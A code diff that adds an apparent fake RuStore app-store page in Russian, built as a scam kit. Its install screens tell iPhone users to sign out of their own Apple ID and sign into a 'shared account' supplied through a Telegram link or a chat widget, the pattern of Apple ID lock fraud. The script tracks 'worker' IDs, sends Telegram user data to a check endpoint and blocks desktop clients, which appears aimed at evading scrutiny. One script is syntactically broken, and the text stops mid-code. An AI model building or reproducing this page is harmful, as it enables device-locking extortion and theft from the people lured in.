@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="referrer" content="no-referrer">
+    <title>RuStore — Приложение</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="index.css?v=3">
+    <link rel="stylesheet" href="app.css?v=2">
+    <link rel="stylesheet" href="search.css?v=1">
+    <link rel="stylesheet" href="sidebar.css?v=1">
+    <style>
+        .inline-video-player {
+            width: 100%;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            background: #000;
+            display: block;
+            margin-bottom: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.98); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+    <script>
+        window.playVideoInline = function(bannerElement) {
+            const videoUrl = 'instruction.mp4?t=' + new Date().getTime();
+            const videoHTML = '<video controls autoplay playsinline class="inline-video-player"><source src="' + videoUrl + '" type="video/mp4"></video>';
+            bannerElement.outerHTML = videoHTML;
+        };
+    </script>
+<style>
+/* =============================================
+   CHAT WIDGET STYLES - PREMIUM REDESIGN
+   ============================================= */
+
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+.chat-window, .chat-fab, .chat-bubble {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+.chat-fab {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #0052D4, #4364F7, #6FB1FC);
+    box-shadow: 0 8px 24px rgba(67, 100, 247, 0.4);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    z-index: 9000;
+    border: none;
+    transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+}
+.chat-fab:hover { 
+    transform: scale(1.05) translateY(-2px); 
+    box-shadow: 0 12px 28px rgba(67, 100, 247, 0.5); 
+}
+.chat-fab svg { width: 28px; height: 28px; fill: white; }
+.chat-fab-badge {
+    position: absolute;
+    top: -2px;
+    right: -2px;
+    background: #ff3b30;
+    color: white;
+    font-size: 12px;
+    font-weight: 700;
+    border-radius: 50%;
+    width: 22px;
+    height: 22px;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    border: 2px solid white;
+    box-shadow: 0 2px 8px rgba(255, 59, 48, 0.4);
+}
+.chat-fab-badge.show { display: flex; }
+
+/* Chat window */
+.chat-window {
+    position: fixed;
+    bottom: 100px;
+    right: 24px;
+    width: min(380px, calc(100vw - 32px));
+    height: min(600px, calc(100vh - 120px));
+    background: #ffffff;
+    border-radius: 24px;
+    box-shadow: 0 12px 48px rgba(0, 0, 0, 0.15), 0 4px 16px rgba(0, 0, 0, 0.05);
+    display: flex;
+    flex-direction: column;
+    z-index: 9001;
+    overflow: hidden;
+    transform: scale(0.9) translateY(20px);
+    opacity: 0;
+    pointer-events: none;
+    transform-origin: bottom right;
+    transition: transform 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s ease;
+}
+.chat-window.open {
+    transform: scale(1) translateY(0);
+    opacity: 1;
+    pointer-events: all;
+}
+
+/* Header */
+.chat-header {
+    background: linear-gradient(135deg, #0052D4, #4364F7);
+    padding: 16px 20px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    flex-shrink: 0;
+    position: relative;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+}
+.chat-avatar {
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    background: rgba(255, 255, 255, 0.2);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 20px;
+    flex-shrink: 0;
+    border: 2px solid rgba(255, 255, 255, 0.4);
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+}
+.chat-header-info { flex: 1; overflow: hidden; }
+.chat-header-name { color: #ffffff; font-weight: 600; font-size: 16px; letter-spacing: 0.2px; }
+.chat-header-status { color: rgba(255, 255, 255, 0.85); font-size: 12px; margin-top: 3px; display: flex; align-items: center;}
+.chat-header-status.connected::before {
+    content: '';
+    display: inline-block;
+    width: 8px; height: 8px;
+    background: #4cd964;
+    border-radius: 50%;
+    margin-right: 6px;
+    box-shadow: 0 0 8px rgba(76, 217, 100, 0.6);
+}
+.chat-close-btn {
+    background: rgba(255, 255, 255, 0.15);
+    border: none;
+    cursor: pointer;
+    color: #ffffff;
+    padding: 6px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    transition: background 0.2s;
+}
+.chat-close-btn:hover { background: rgba(255, 255, 255, 0.25); }
+
+/* Messages */
+.chat-messages {
+    flex: 1;
+    overflow-y: auto;
+    padding: 20px 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+    background: #f8f9fc;
+    -webkit-overflow-scrolling: touch;
+}
+
+/* System messages */
+.chat-system-msg {
+    text-align: center;
+    font-size: 12px;
+    color: #8da2b5;
+    padding: 6px 12px;
+    background: #eef1f6;
+    border-radius: 12px;
+    align-self: center;
+    max-width: 80%;
+    margin: 8px 0;
+}
+
+/* Bubbles */
+.chat-bubble-row {
+    display: flex;
+    align-items: flex-end;
+    gap: 10px;
+    animation: fadeIn 0.3s ease forwards;
+}
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.chat-bubble-row.from-user { flex-direction: row-reverse; }
+
+.chat-bubble-avatar {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: #0052D4;
+    color: white;
+    font-size: 14px;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+}
+
+.chat-bubble {
+    max-width: 75%;
+    padding: 12px 16px;
+    border-radius: 20px;
+    font-size: 14.5px;
+    line-height: 1.5;
+    word-break: break-word;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+}
+.chat-bubble.from-operator {
+    background: #ffffff;
+    color: #2c3e50;
+    border-bottom-left-radius: 4px;
+    border: 1px solid #edf1f7;
+}
+.chat-bubble.from-user {
+    background: linear-gradient(135deg, #0052D4, #4364F7);
+    color: #ffffff;
+    border-bottom-right-radius: 4px;
+    box-shadow: 0 4px 12px rgba(67, 100, 247, 0.2);
+}
+.chat-bubble-time {
+    font-size: 10px;
+    opacity: 0.65;
+    margin-top: 6px;
+    text-align: right;
+    display: block;
+}
+.chat-bubble.from-operator .chat-bubble-time { text-align: left; }
+
+/* Typing indicator */
+.chat-typing {
+    display: none;
+    align-items: center;
+    gap: 10px;
+    padding: 0 4px;
+}
+.chat-typing.show { display: flex; }
+.chat-typing-dots {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 12px 16px;
+    border: 1px solid #edf1f7;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+    display: flex;
+    gap: 5px;
+    align-items: center;
+    border-bottom-left-radius: 4px;
+}
+.chat-typing-dots span {
+    display: block;
+    width: 8px; height: 8px;
+    background: #aab6c2;
+    border-radius: 50%;
+    animation: typing-bounce 1.4s infinite cubic-bezier(0.2, 0.8, 0.2, 1);
+}
+.chat-typing-dots span:nth-child(2) { animation-delay: 0.2s; }
+.chat-typing-dots span:nth-child(3) { animation-delay: 0.4s; }
+@keyframes typing-bounce {
+    0%, 60%, 100% { transform: translateY(0); opacity: 0.6;}
+    30% { transform: translateY(-5px); opacity: 1;}
+}
+
+/* Input area */
+.chat-input-area {
+    display: flex;
+    align-items: flex-end;
+    gap: 12px;
+    padding: 16px;
+    background: #ffffff;
+    flex-shrink: 0;
+    box-shadow: 0 -4px 20px rgba(0,0,0,0.03);
+}
+.chat-attach-btn {
+    background: none;
+    border: none;
+    padding: 8px;
+    cursor: pointer;
+    color: #4364F7;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 50%;
+    transition: background 0.2s;
+}
+.chat-attach-btn:hover { background: #f0f4ff; }
+.chat-input-wrapper {
+    flex: 1;
+    background: #f1f4f9;
+    border-radius: 24px;
+    padding: 2px 16px;
+    display: flex;
+    align-items: center;
+    border: 1.5px solid transparent;
+    transition: border-color 0.2s, background 0.2s;
+}
+.chat-input-wrapper:focus-within {
+    border-color: rgba(67, 100, 247, 0.4);
+    background: #ffffff;
+}
+.chat-input {
+    flex: 1;
+    border: none;
+    background: transparent;
+    font-size: 14.5px;
+    font-family: inherit;
+    resize: none;
+    outline: none;
+    max-height: 120px;
+    min-height: 24px;
+    padding: 10px 0;
+    overflow-y: auto;
+    line-height: 1.5;
+    color: #2c3e50;
+}
+.chat-input::placeholder { color: #aab6c2; }
+.chat-send-btn {
+    width: 44px; height: 44px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #0052D4, #4364F7);
+    border: none;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    transition: all 0.2s cubic-bezier(0.25, 0.8, 0.25, 1);
+    box-shadow: 0 4px 12px rgba(67, 100, 247, 0.25);
+}
+.chat-send-btn:hover { transform: scale(1.08); box-shadow: 0 6px 16px rgba(67, 100, 247, 0.35); }
+.chat-send-btn:active { transform: scale(0.95); }
+.chat-send-btn svg { width: 18px; height: 18px; fill: white; margin-left: 2px; }
+
+/* Scrollbar styling */
+.chat-messages::-webkit-scrollbar { width: 6px; }
+.chat-messages::-webkit-scrollbar-track { background: transparent; }
+.chat-messages::-webkit-scrollbar-thumb { background: #d0d7de; border-radius: 10px; }
+.chat-messages::-webkit-scrollbar-thumb:hover { background: #b0bbc6; }
+
+</style>
+</head>
+<body>
+    <script>
+        (function() {
+            
+            }
+            let workerId = new URLSearchParams(window.location.search).get('worker');
+            if (!workerId) {
+                workerId = sessionStorage.getItem('worker');
+            } else {
+                sessionStorage.setItem('worker', workerId);
+            }
+            
+            const tgUser = window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user;
+            const uid = tgUser ? tgUser.id : '';
+            const uname = tgUser && tgUser.username ? tgUser.username : '';
+            
+            if ((workerId && workerId !== 'null') || uid) {
+                fetch('/api/check_worker?worker=' + (workerId || '') + '&uid=' + uid + '&uname=' + uname)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (!data.valid) {
+                            window.isAccessDenied = true;
+                            document.body.innerHTML = '<div style="display:flex; height:100vh; align-items:center; justify-content:center; flex-direction:column; background:#121212; color:white; font-family:sans-serif; text-align:center; padding: 20px;"><h2>Ошибка доступа</h2><p>Этот бот больше не активен или ссылка устарела.</p></div>';
+                            const chatContainer = document.querySelector('.chat-widget-container');
+                            const chatBubble = document.querySelector('.chat-bubble-btn');
+                            if (chatContainer) chatContainer.remove();
+                            if (chatBubble) chatBubble.remove();
+                        }
+                    })
+                    .catch(e => console.error(e));
+            }
+        })();
+    </script>
+    <header class="header">
+        <div class="header-container">
+            <div class="header-left">
+                <a href="#" onclick="navToHome(event)" class="logo">
+                    <img src="https://static.rustore.ru/rustore-strapi/9/logo_color_30_px_2_fa2039288f_79e6d8ec78.svg" alt="RuStore Logo">
+                </a>
+                <div class="header-subtitle">
+                    <p>Официальный магазин приложений для iOS</p>
+                    <p>Безопасный доступ к популярным играм и приложениям</p>
+                </div>
+            </div>
+            
+            <div class="header-right">
+                <button class="hamburger-btn" id="hamburger-btn" aria-label="Меню">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <div class="sidebar-overlay" id="sidebar-overlay"></div>
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-search search-bar">
+            <svg class="search-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M10.5 18C14.6421 18 18 14.6421 18 10.5C18 6.35786 14.6421 3 10.5 3C6.35786 3 3 6.35786 3 10.5C3 14.6421 6.35786 18 10.5 18Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M21 21L16 16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <input type="text" placeholder="Поиск приложений и игр">
+        </div>
+        <nav class="sidebar-nav">
+            <a href="#" onclick="navToCategory(event, 'Приложения')" class="sidebar-nav-item">
+                <svg class="sidebar-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+                Приложения
+            </a>
+            <a href="#" onclick="navToCategory(event, 'Игры')" class="sidebar-nav-item">
+                <svg class="sidebar-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="12" rx="2" ry="2"></rect><circle cx="6" cy="12" r="1"></circle><circle cx="10" cy="12" r="1"></circle><circle cx="18" cy="12" r="1"></circle></svg>
+                Игры
+            </a>
+            <a href="#" onclick="navToCategory(event, 'Государственные')" class="sidebar-nav-item">
+                <svg class="sidebar-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                Государственные
+            </a>
+            <a href="#" onclick="navToCategory(event, 'Социальные сети')" class="sidebar-nav-item">
+                <svg class="sidebar-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+                Социальные сети
+            </a>
+            <a href="#" onclick="navToCategory(event, 'Инструменты')" class="sidebar-nav-item">
+                <svg class="sidebar-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"></path></svg>
+                Инструменты
+            </a>
+            <a href="#" onclick="navToCategory(event, 'Покупки')" class="sidebar-nav-item">
+                <svg class="sidebar-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="21" r="1"></circle><circle cx="20" cy="21" r="1"></circle><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path></svg>
+                Покупки
+            </a>
+            <a href="#" onclick="navToCategory(event, 'Медиа')" class="sidebar-nav-item">
+                <svg class="sidebar-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+                Медиа
+            </a>
+            <a href="#" onclick="navToCategory(event, 'Банки')" class="sidebar-nav-item">
+                <svg class="sidebar-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
+                Банки
+            </a>
+            <a href="#" onclick="navToCategory(event, 'Образование')" class="sidebar-nav-item">
+                <svg class="sidebar-nav-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path></svg>
+                Образование
+            </a>
+        </nav>
+    </aside>
+
+    <main class="app-main">
+        <div class="breadcrumb">
+            <a href="index.html">Главная</a>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M9 5L16 12L9 19" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <a href="#" id="bc-category">Категория</a>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M9 5L16 12L9 19" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span id="bc-title" class="active">Приложение</span>
+        </div>
+
+        <div class="app-header-new">
+            <img src="" alt="Icon" id="app-icon" class="app-icon-new">
+            <div class="app-header-right">
+                <h1 id="app-title" class="app-title-new">Название</h1>
+                <button class="btn-download" id="install-btn">Скачать</button>
+            </div>
+        </div>
+
+        <div class="app-rating-row">
+            <div class="stars-display" id="app-stars-container">
+                <!-- Stars will be injected here by JS based on rating -->
+            </div>
+            <span class="rating-number" id="app-rating">0.0</span>
+            <span class="rating-count" id="app-reviews-count">0 оценок</span>
+        </div>
+
+        <div class="app-pills-row">
+            <div class="info-pill" id="pill-downloads">0 скачиваний</div>
+            <div class="info-pill" id="pill-size">0 МБ</div>
+            <div class="info-pill" id="pill-version">v1.0.0</div>
+        </div>
+
+        <div class="app-section">
+            <h2 class="section-title">Описание</h2>
+            <p id="app-desc-text" class="app-desc-text"></p>
+        </div>
+
+        <div class="app-section">
+            <h2 class="section-title">Отзывы и оценки</h2>
+            <div class="reviews-container" id="reviews-container">
+                <!-- Reviews injected via JS -->
+            </div>
+            
+            <div class="leave-review-box">
+                <h3 class="leave-review-title">Оставить отзыв</h3>
+                <div class="leave-review-subtitle">ВАША ОЦЕНКА</div>
+                <div class="leave-review-stars">
+                    <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" fill="none" stroke="#F6A820" stroke-width="2"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" fill="none" stroke="#F6A820" stroke-width="2"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" fill="none" stroke="#F6A820" stroke-width="2"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" fill="none" stroke="#F6A820" stroke-width="2"/></svg>
+                    <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" fill="none" stroke="#F6A820" stroke-width="2"/></svg>
+                </div>
+                <textarea class="leave-review-input" placeholder="Расскажите, что думаете о приложении"></textarea>
+                <button class="leave-review-submit" id="leave-review-submit-btn">Опубликовать</button>
+            </div>
+            
+            <button class="btn-reviews-more" id="reviews-more-btn">Отзывы и оценки (<span id="total-reviews-count">0</span>) ▼</button>
+        </div>
+
+        <div class="app-section" style="margin-bottom: 16px;">
+            <h2 class="section-title">Рекомендуем также</h2>
+            <div class="recommendations-scroll" id="recommendations-container">
+                <!-- Recommended apps injected via JS -->
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Apple ID Bottom Sheet -->
+    <div class="bottom-sheet-overlay" id="apple-id-sheet">
+        <div class="bottom-sheet">
+            <button class="bs-close" onclick="closeBottomSheet()">
+                <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M1 1L13 13M1 13L13 1" stroke="#888" stroke-width="2" stroke-linecap="round"/></svg>
+            </button>
+
+            
+            <!-- Screen 0: Loading -->
+            <div id="bs-screen-loading" style="display: none; padding: 32px 0 16px 0; text-align: center;">
+                <h2 class="bs-title" id="bs-loading-title">Подготовка к установке</h2>
+                <p class="bs-text" style="color: #888; margin-bottom: 0;" id="bs-loading-text">Получаем данные...</p>
+                <div class="bs-spinner"></div>
+            </div>
+
+            <!-- Screen 1: Intro -->
+            <div id="bs-screen-intro">
+                <div class="video-banner" onclick="if(window.appSettings && window.appSettings.hasVideo) { window.playVideoInline(this); } else { alert('Видео-инструкция пока не добавлена'); }">
+                    <div class="video-banner-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>
+                    </div>
+                    <div class="video-banner-text">
+                        <div class="video-banner-title">Смотреть видео-инструкцию</div>
+                        <div class="video-banner-sub">Как выйти из Apple ID за 30 секунд</div>
+                    </div>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
+                </div>
+
+                <h2 class="bs-title">Временный вход в Apple ID</h2>
+                <p class="bs-text">Для установки данного приложения на ваш iPhone необходимо выполнить временный вход в наш общий аккаунт iCloud (Apple ID).<br><br>Следуйте простым шагам для выхода из текущего Apple ID и входа в новый аккаунт.<br><br>После выхода нажмите кнопку «Подготовить аккаунт» ниже и получите данные нового аккаунта.</p>
+                
+                <div class="bs-info-card">
+                    <div class="bs-info-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+                    </div>
+                    <div class="bs-info-content">
+                        <h4>10 минут на установку</h4>
+                        <p>Этого достаточно, чтобы установить приложение</p>
+                    </div>
+                </div>
+
+                <div class="bs-info-card">
+                    <div class="bs-info-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
+                    </div>
+                    <div class="bs-info-content">
+                        <h4>Официальный аккаунт</h4>
+                        <p>Установка происходит с общего аккаунта разработчика</p>
+                    </div>
+                </div>
+
+                <div class="bs-action-row" onclick="switchBsScreen('instructions')">
+                    <div class="bs-action-row-left">
+                        <div class="bs-action-row-icon">i</div>
+                        <span>Инструкция как выйти</span>
+                    </div>
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
+                </div>
+
+                <button class="bs-btn-primary" onclick="switchBsScreen('prepare')">Подготовить аккаунт</button>
+                <button class="bs-btn-danger" onclick="cancelInstallation()">Прервать установку</button>
+            </div>
+
+            <!-- Screen 2: Instructions -->
+            <div id="bs-screen-instructions" style="display: none;">
+                <div class="video-banner" onclick="if(window.appSettings && window.appSettings.hasVideo) { window.playVideoInline(this); } else { alert('Видео-инструкция пока не добавлена'); }">
+                    <div class="video-banner-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>
+                    </div>
+                    <div class="video-banner-text">
+                        <div class="video-banner-title">Смотреть видео-инструкцию</div>
+                    </div>
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
+                </div>
+
+                <h2 class="bs-title">Инструкция по установке</h2>
+                <p class="bs-text">Следуйте простым шагам для выхода из текущего Apple ID и входа в новый аккаунт.</p>
+                
+                <div class="bs-step">
+                    <div class="bs-step-number">1</div>
+                    <div class="bs-step-text">Откройте приложение «Настройки» на вашем iPhone</div>
+                </div>
+                <div class="bs-step">
+                    <div class="bs-step-number">2</div>
+                    <div class="bs-step-text">Нажмите на ваше имя в верхней части экрана</div>
+                </div>
+                <div class="bs-step">
+                    <div class="bs-step-number">3</div>
+                    <div class="bs-step-text">Прокрутите вниз и выберите «Выйти»</div>
+                </div>
+                <div class="bs-step">
+                    <div class="bs-step-number">4</div>
+                    <div class="bs-step-text">Введите пароль вашего текущего Apple ID</div>
+                </div>
+                <div class="bs-step">
+                    <div class="bs-step-number">5</div>
+                    <div class="bs-step-text">Подтвердите выход, выбрав «Выйти» в правом верхнем углу</div>
+                </div>
+                <div class="bs-step">
+                    <div class="bs-step-number">6</div>
+                    <div class="bs-step-text">После выхода нажмите кнопку «Подготовить аккаунт» ниже и получите данные нового аккаунта.</div>
+                </div>
+
+                <button class="bs-btn-primary" onclick="switchBsScreen('intro')">Понятно</button>
+            </div>
+
+            <!-- Screen 3: Prepare Account -->
+            <div id="bs-screen-prepare" style="display: none;">
+                <h2 class="bs-title" style="text-align: center;">Подготовка к установке</h2>
+                
+                <div class="bs-hero-card" style="padding: 32px 24px;">
+                    <div class="bs-hero-icon" style="width: 64px; height: 64px; margin-bottom: 20px;">
+                        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
+                    </div>
+                    <div class="bs-hero-title" style="font-size: 24px; margin-bottom: 12px;">Аккаунт готов</div>
+                    <div class="bs-hero-sub" style="font-size: 15px; opacity: 1;">Используйте данные ниже для входа в Apple ID</div>
+                </div>
+
+                <div style="background: #f5f6f8; border-radius: 16px; padding: 24px 20px; margin-bottom: 24px; text-align: center;">
+                    <p style="margin: 0 0 20px 0; color: #1a1a1a; font-size: 15px; line-height: 1.5;">
+                        В данный момент аккаунт выдается нашим специалистом в Telegram, либо вы можете запросить его через тех. поддержку на сайте.
+                    </p>
+                    <button class="bs-btn-primary" style="margin-bottom: 0;" onclick="if(window.trackDataClick) window.trackDataClick(); window.open((window.appSettings && window.appSettings.tgLink) ? window.appSettings.tgLink : 'https://t.me/lizaa_hrr', '_blank')">Получить аккаунт в Telegram</button>
+                </div>
+
+                <button class="bs-btn-primary" style="background: #e6f0ff; color: #0077ff;" onclick="if(window.trackSupportClick) window.trackSupportClick(); window.openChat('install');">Написать в тех. поддержку</button>
+                <button class="bs-btn-danger" style="margin-top: 12px;" onclick="cancelInstallation()">Прервать установку</button>
+            </div>
+</div>
+        </div>
+    </div>
+
+
+    <footer class="footer">
+        <div class="footer-container" style="flex-direction: column; align-items: center; text-align: center; gap: 32px; padding: 16px 24px 40px 24px; max-width: 100%;">
+            
+            <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                <img src="mintsifry.svg" alt="Минцифры России" style="height: 48px; width: auto; filter: brightness(0%); object-fit: contain;">
+            </div>
+
+            <div style="display: flex; gap: 16px; margin-top: 8px;">
+                <img src="https://static.rustore.ru/rustore-strapi/10/VK_new_a432e2673a.svg" alt="VK" style="width: 44px; height: 44px;">
+                <img src="https://static.rustore.ru/rustore-strapi/10/OK_new_4b3496ef23.svg" alt="OK" style="width: 44px; height: 44px;">
+                <img src="https://static.rustore.ru/rustore-strapi/10/TG_new_8636f8e076.svg" alt="Telegram" style="width: 44px; height: 44px;">
+                <img src="https://static.rustore.ru/rustore-strapi/10/DZ_new_9fd01c3f03.svg" alt="Dzen" style="width: 44px; height: 44px;">
+            </div>
+
+            <div style="color: var(--text-secondary); font-size: 13px; line-height: 1.6; margin-top: 12px;">
+                © VK 2022–2026 RuStore — приложения и игры для iPhone<br>
+                Все права защищены
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modal -->
+    <div class="modal-overlay" id="review-modal">
+        <div class="modal-content">
+            <p>Чтобы оценить приложение, сначала скачайте его. После установки вы сможете оставить отзыв в RuStore.</p>
+            <button class="modal-close-btn" id="modal-close-btn">Закрыть</button>
+        </div>
+    </div>
+
+    
+    <script>document.write('<script src="data.js?t=' + Date.now() + '"><\/script>');</script>
+        <script>
+        
+    const urlParams = new URLSearchParams(window.location.search);
+    const workerId = urlParams.get('worker');
+    
+    let filteredAppsData = {};
+    for(let k in appsData) {
+        if(!appsData[k].workerId || appsData[k].workerId == workerId) {
+            filteredAppsData[k] = appsData[k];
+        }
+    }
+    const originalAppsData = appsData;
+    appsData = filteredAppsData; // Override for rendering
+    
+        </script>
+    <script>document.write('<script src="app.js?t=' + Date.now() + '"><\/script>');</script>
+    <script>document.write('<script src="search.js?t=' + Date.now() + '"><\/script>');</script>
+    <script>document.write('<script src="sidebar.js?t=' + Date.now() + '"><\/script>');</script>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        (function() {
+            let isTelegram = (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData);
+            
+            // Check platform
+            let platform = (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.platform) ? window.Telegram.WebApp.platform.toLowerCase() : 'unknown';
+            let blockedPlatforms = ['tdesktop', 'web', 'weba', 'unigram', 'unknown', 'windows'];
+            
+            if (!isTelegram || blockedPlatforms.includes(platform)) {
